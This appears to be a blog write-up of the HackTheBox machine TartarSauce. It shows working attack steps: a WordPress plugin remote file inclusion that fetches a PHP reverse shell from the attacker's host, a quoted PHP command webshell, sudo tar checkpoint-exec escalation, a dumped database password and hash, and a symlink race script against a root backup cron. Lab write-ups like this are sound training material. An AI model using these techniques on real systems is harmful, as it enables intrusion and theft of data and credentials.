---
title: "TartarSauce"
date: 2021-08-10 11:20:00 +0530
categories: [HackTheBox, Linux Machines]
tags: [linux, wordpress-plugin, rfi, tar, mysql, cronjob, symlink, race-condition, hackthebox]
image: /assets/img/Posts/TartarSauce/TartarSauce.png
---
Foothold starts with **Wordpress plugin gwolle-gb** which is vulnerable to **Remote File-Inclusion**. You can get user by exploiting **sudo** privileges on **tar**, then grabbing **MySQL** DB password from web-root and dumping database. There's a **cronjob** running as root, which creates gzip files using tar. Exploiting the race condition,I can create **symlinks** on the files inside the zip which will be resolved, once root extracts those zip. This results in file read.
# Enumeration
## Masscan + Nmap
```bash
$ masscan -p1-65535,U:1-65535 `IP` --rate=5000 -e tun0 | tee masscan.out
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.88
```
Parse those ports to nmap:
```bash
$ ports=$(cat masscan.out |awk '{ print $4 }' | sed 's/\/tcp//;s/\/udp//' | tr '\n' ',' | sed 's/,$//')
$ nmap -v -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 5 disallowed entries
| /webservices/tar/tar/source/
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
```

## HTTP
Directory brute-forcing:
```bash
$ feroxbuster -u http://tartarsauce.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,txt,html -C 401,403,405 -W 0

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.3.1
───────────────────────────┬──────────────────────
     Target Url            │ http://tartarsauce.htb/
     Threads               │ 50
     Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
     Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     Status Code Filters   │ [401, 403, 405]
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.3.1
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Word Count Filter     │ 0
     Extensions            │ [php, txt, html]
     Recursion Depth       │ 4
     New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      563l      128w    10766c http://tartarsauce.htb/index.html
200      563l      128w    10766c http://tartarsauce.htb/
200        7l       12w      208c http://tartarsauce.htb/robots.txt
301        9l       28w      324c http://tartarsauce.htb/webservices
301        9l       28w      327c http://tartarsauce.htb/webservices/wp
301        9l       28w      336c http://tartarsauce.htb/webservices/wp/wp-admin
301        9l       28w      339c http://tartarsauce.htb/webservices/wp/wp-includes
301        9l       28w      338c http://tartarsauce.htb/webservices/wp/wp-content
200       63l      173w     2338c http://tartarsauce.htb/webservices/wp/wp-login.php
200      196l      563w        0c http://tartarsauce.htb/webservices/wp/
301        9l       28w      343c http://tartarsauce.htb/webservices/wp/wp-admin/images
301        9l       28w      345c http://tartarsauce.htb/webservices/wp/wp-admin/includes
200       98l      844w     7413c http://tartarsauce.htb/webservices/wp/readme.html
200        5l       15w      135c http://tartarsauce.htb/webservices/wp/wp-trackback.php
301        9l       28w      339c http://tartarsauce.htb/webservices/wp/wp-admin/js
301        9l       28w      340c http://tartarsauce.htb/webservices/wp/wp-admin/css
301        9l       28w      341c http://tartarsauce.htb/webservices/wp/wp-admin/user
200       15l       72w     1168c http://tartarsauce.htb/webservices/wp/wp-admin/install.php
200      385l     3179w    19935c http://tartarsauce.htb/webservices/wp/license.txt
```

If I check out the source code, it has one not-so-useful comment, way below empty lines: `<!--Carry on, nothing to see here :D-->`
and this is what I get from robots.txt 
```python
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

Only `http://tartarsauce.htb/webservices/monstra-3.0.4/` is reachable. 

## Monstra CMS
`http://tartarsauce.htb/webservices/monstra-3.0.4/` gives me a CMS, version is just written at the bottom of the page which is `Monstra 3.0.4`

Checking for exploits:
```bash
$ searchsploit Monstra 3.0.4
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote C | php/webapps/43348.txt
Monstra CMS 3.0.4 - Arbitrary Folder Deletion                        | php/webapps/44512.txt
Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload              | php/webapps/48479.txt
Monstra cms 3.0.4 - Persitent Cross-Site Scripting                   | php/webapps/44502.txt
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                       | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                       | php/webapps/44646.txt
Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking)   | php/webapps/45164.txt
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I see Arbitrary file upload, Remote code execution but it's all authenticated.
All the users functionality aren't available except this admin login page at `/webservices/monstra-3.0.4/admin/`

![tartarsauce-1.png](/assets/img/Posts/TartarSauce/tartarsauce-1.png)
And I can just login with `admin:admin`.

Now the authenticated File upload / Remote Code execution says:
```c
Exploit Title: Monstra CMS - 3.0.4 RCE
Vendor Homepage: http://monstra.org/
Software Link:
https://bitbucket.org/Awilum/monstra/downloads/monstra-3.0.4.zip
Discovered by: Ishaq Mohammed
Contact: https://twitter.com/security_prince
Website: https://about.me/security-prince
Category: webapps
Platform: PHP
Advisory Link: https://blogs.securiteam.com/index.php/archives/3559

Description:

MonstraCMS 3.0.4 allows users to upload arbitrary files which leads to a
remote command execution on the remote server.

Vulnerable Code:

https://github.com/monstra-cms/monstra/blob/dev/plugins/box/filesmanager/filesmanager.admin.php
line 19:

 public static function main()
    {
        // Array of forbidden types
        $forbidden_types = array('html', 'htm', 'js', 'jsb', 'mhtml', 'mht',
                                 'php', 'phtml', 'php3', 'php4', 'php5','phps',
                                 'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh','ksh', 
								 'bsh', 'c', 'htaccess', 'htpasswd',
                                 'exe', 'scr', 'dll', 'msi', 'vbs', 'bat','com', 
								 'pif', 'cmd', 'vxd', 'cpl', 'empty');

Proof of Concept
Steps to Reproduce:

1. Login with a valid credentials of an Editor
2. Select Files option from the Drop-down menu of Content
3. Upload a file with PHP (uppercase)extension containing the below code: (EDB Note: You can also use .php7)

<?php 
	$cmd=$_GET['cmd'];
	system($cmd); 
?>
```

I tried exploiting this vulnerability for too long, didn't work. Not a single file was uploading.

## Wordpress
Running `wpscan`:
```bash
$ wpscan --url http://tartarsauce.htb/webservices/ -e --random-user-agent
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.11
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
Scan Aborted: The target is responding with a 403, this might be due to a WAF. Well... --random-user-agent didn't work, you're on your own now!
```

Visiting `/webservices/wp/wp-links-opml.php` which I got from `feroxbuster` shows the wordpress version:
```xml
<opml version="1.0">
<head>
<title>Links for Test blog</title>
<dateCreated>Fri, 06 Aug 2021 17:07:30 GMT</dateCreated>
<!-- generator="WordPress/4.9.4" -->
</head>
<body> </body>
</opml>
```

There are some vulnerabilities but those doesn't seem to good at the moment:
```bash
$ searchsploit WordPress 4.9.4
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion     | php/webapps/44949.txt
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Po | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service              | php/dos/47800.py
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Meta | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities  | php/webapps/39553.txt
WordPress Plugin EZ SQL Reports < 4.11.37 - Multiple Vulnerabilities | php/webapps/38176.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection            | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection          | php/webapps/48918.sh
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation      | php/webapps/44595.rb
WordPress Plugin Userpro < 4.9.17.1 - Authentication Bypass          | php/webapps/43117.txt
WordPress Plugin UserPro < 4.9.21 - User Registration Privilege Esca | php/webapps/46083.txt
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let's enumerate some directory based on Wordpress:
```bash
$ ffuf -u http://tartarsauce.htb/webservices/wp/FUZZ -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -mc 200,204 -s  > ffuf-wordpress.out
$ cat ffuf-wordpress.out  | grep plugins
wp-content/plugins/
wp-content/plugins/akismet/
wp-content/plugins/akismet/akismet.php
wp-content/plugins/akismet/readme.txt
wp-content/plugins/index.php
```

This does show that `akismet` plugin exists for this wordpress. But wpscan didn't give it. That may mean there are some other plugins, still unknown.

```bash
$ ffuf -u http://10.10.10.88/webservices/wp/FUZZ -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.88/webservices/wp/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

wp-content/plugins/akismet/ [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-content/plugins/gwolle-gb/ [Status: 200, Size: 0, Words: 1, Lines: 1]
:: Progress: [13366/13366] :: Job [1/1] :: 437 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
```

So, there exists another plugin named `gwolle-gb`. I was wondering why `wpscan` didn't show the plugins and it seems like we've to change the mode for plugins enumeration now.

```bash
$ wpscan --url http://10.10.10.88/webservices/wp/ -e p  --plugins-detection aggressive

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2021-03-02T18:10:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt

[+] gwolle-gb
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2021-03-03T11:41:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 4.1.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 [+] Elapsed time: 00:00:52
```

Version came out as `2.3.10` _"Version: 2.3.10 (100% confidence)"_
I see a readme.txt as output in wpscan output at `/wp/wp-content/plugins/gwolle-gb/readme.txt`. I tried to find the version in readme, it's much down below between a lot of output but here it is: 
```html
== Changelog ==

= 2.3.10 =
* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D
```
Also it says that the version is being fake to be `2.3.10` but it's `1.5.3`. -_-

Let's google if it has some vulnerabilities:
```bash
root@TheCaretaker:~/HTB# googler gwolle-gb 1.5.3 exploitdb

 1.  WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File ...
     https://www.exploit-db.com/exploits/38861
     03-Dec-2015 —

 2.  WordPress Plugin Gwolle Guestbook Remote File Inclusion ...
     https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-gwolle-guestbook-remote-file-inclusion-1-5-3/
     WordPress Plugin Gwolle Guestbook is prone to a remote file inclusion vulnerability because it fails to properly verify user-supplied input.
```
It's vulnerable to  Remote File Inclusion (RFI).
Which you can trigger with this syntax url: `http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]`

If I do the same with tartarsauce and my local IP:
``http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.32/phprev.php`` I receive the requests:
```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.88 - - [09/Aug/2021 21:09:26] code 404, message File not found
10.10.10.88 - - [09/Aug/2021 21:09:26] "GET /phprev.phpwp-load.php HTTP/1.0" 404 -
```

Which means I don't need to provide any file name, it's already fetching `wp-load.php`, I can just move my `phprev.php` to `wp-load.php` to spawn a shell.
```bash
$ rlwrap -cArf . nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.88] 60854
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
 11:42:32 up 19:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1189): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TartarSauce:/$
```
# Getting user with tar
If I list what `sudo` permissions www-data has:
```bash
www-data@TartarSauce:/$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

Exploiting sudo perms on `tar`:
```bash
www-data@TartarSauce:/$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
whoami
onuma
```

# Dumping MySQL
I see `config.php` in wp directory in web-root. It contains username and password for MySQL database.
```bash
onuma@TartarSauce:/var/www/html/webservices/wp$ cat wp-config.php
<?php
/** The name of the database for WordPress */
define('DB_NAME', 'wp');

/** MySQL database username */
define('DB_USER', 'wpuser');

/** MySQL database password */
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Logging in and dumping the database:
```bash
$ mysql -uwpuser -p
w0rdpr3$$d@t@b@$3@cc3$$
Welcome to the MySQL monitor.  Commands end with ; or \g.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wp                 |
+--------------------+
2 rows in set (0.00 sec)

mysql> use wp;
Database changed

mysql> show tables;
+-----------------------+
| Tables_in_wp          |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_gwolle_gb_entries  |
| wp_gwolle_gb_log      |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
14 rows in set (0.00 sec)

mysql> describe wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(255)        | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   | MUL |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)        | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.01 sec)

mysql> select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| wpadmin    | $P$BBU0yjydBz9THONExe2kPEsvtjStGe1 |
+------------+------------------------------------+
1 row in set (0.00 sec)
```
 
 I wasn't able to crack this hash.
 
 
# Privesc with cronjob
 I saw `shadow_bkp` at home which links to /dev/null and that's done by root.
 I wonder if some cronjob is running. I couldn't see any in `/etc/crontab`.
 ```bash
$ ./pspy32
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
 
2021/08/09 12:31:22 CMD: UID=0    PID=3115   | /bin/bash /usr/sbin/backuperer
```
 
`backuperer` is a bash script:
```bash
#!/bin/bash
#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------
# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check
# formatting
printbdr()
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
bdr=$(printbdr)
# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg
# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check
# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30
# Test the backup integrity
integrity_chk()
    /usr/bin/diff -r $basedir $check$basedir
/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
```

This just takes 100 characters from `/dev/urandom` and creates .`sha1sum` named hidden file in `/var/tmp`
```bash
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
```
I'll treat it as `/var/tmp/.xxxxxxxxxxxxxxx` from now on.

1. Remove all previous hidden files in ``/var/tmp`` and ``/var/tmp/check``
```bash
/bin/rm -rf /var/tmp/.* /var/tmp/check
```
2. Create `gzip` file of directory `/var/www/html` as onuma at `/var/tmp/.xxxxxxxxxxxx`, then sleep for 30 seconds.
```bash
/usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.xxxxxxxxxxxxxxxx /var/www/html &
/bin/sleep 30
```
3. Create directory `/var/tmp/check`, decompress that hidden gzip file to `/var/tmp/check` 
```bash
/bin/mkdir /var/tmp/check
/bin/tar -zxvf /var/tmp/.xxxxxxxxxxxxxxxx -C /var/tmp/check
```
4. Defined a `integrity_chk()` function which recursively diffs ``/var/www/html`` and ``/var/tmp/var/www/html``
```bash
integrity_chk()
    /usr/bin/diff -r /var/www/html /var/tmp/var/www/html
```

5. If `diff` fails to checks as both directories being same i.e. result is `false`:
	send errors to `/var/backups/onuma_backup_error.txt`
	else: (`diff` runs to smoothly as both directories are same i.e. result is `true`)
	```/bin/mv /var/tmp/.xxxxxxxxxxxx /var/backups/onuma-www-dev.bak``` and ``/bin/rm -rf /var/tmp/check .*``
```bash
if [[ $(integrity_chk) ]]
then
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
```

Most vulnerable line here is `/bin/tar -zxvf /var/tmp/.xxxx -C /var/tmp/check` and not any other.
Here's why:
- 2nd point creates a gzip file `/usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.xxx /var/www/html` but with user onuma.
- When `/bin/tar -zxvf /var/tmp/.xxxx -C /var/tmp/check` is run by root it decompresses the `gzip` created by onuma. 
- Creating a `symlink` of `gzip` file to root flag won't work since, `onuma` created the `gzip` file and has no perms on reading files owned by root. Secondly, even if root would've created the zip, the file wouldn't resolve and would've still be a symlink.
- The only way the way the symlink will be resolved will by compressing directory or decompressing it. Former done by onuma, latter by root. 

Here's what to do:
- Once the gzip is created at `/var/tmp/`, Unzip
- Change the contents inside the gzip, make any file symlink to `/root/root.txt`
- Zip it again
I need to do all of this in 30 seconds, which is the sleep time. Then once the file is unzipped by root, the symlink will be resolved. And since the zips no longer matches the original one, all the `diff` is put onto `/var/backups/onuma_backup_error.txt`

I made this script for the exploit:
```bash
#!/bin/bash
while true;
do
tempdir=/dev/shm/temp
file=$(echo /var/tmp/.* | awk '{print $3}')

echo --- File found $file

mkdir -p $tempdir
echo --- Directory created $tempdir

echo --- Extracting $file
tar -zxf $file -C $tempdir

echo --- Removing $tempdir/var/www/html/robots.txt
rm $tempdir/var/www/html/robots.txt

echo --- Symlink added
ln -s /root/root.txt $tempdir/var/www/html/robots.txt
ls -l $tempdir/var/www/html/robots.txt

echo --- Removing gzip $file
rm $file

echo --- Creating gzip $file 
cd $tempdir
tar -zcf $file var

sleep 15
done
```
Point to note in this script is, `cd $tempdir`. 
Suppose, If I create the new gzip from remote path like ``/tmp``, if my directories to zip lies at `/dev/shm/temp/var`, the gzip created will have the structure as dev->shm->temp->var->www->html. But I want the structure as var->www->html. So, I need to have var directory at PWD.
That's why `tar -zcf $file var` works and `tar -zcf $file /dev/shm/temp/var` doesn't.

And after all this runs, the new `gzip` when decompressed by root at `/var/tmp/check` and `diffed` with `/var/www/html` will not match.
All differences are passed to `/var/backups/onuma_backup_error.txt`:
```bash
------------------------------------------------------------------------
Integrity Check Error in backup last ran :  Tue Aug 10 01:24:14 EDT 2021
------------------------------------------------------------------------
/var/tmp/.7f87bdbd08c8ff35760600b1dfc84c370ee93601
diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
1,7c1
< User-agent: *
< Disallow: /webservices/tar/tar/source/
< Disallow: /webservices/monstra-3.0.4/
< Disallow: /webservices/easy-file-uploader/
< Disallow: /webservices/developmental/
< Disallow: /webservices/phpmyadmin/
<
---
> e79abdab8b8a4b64f8579a10b2cd09f9
```

And that's the root flag.
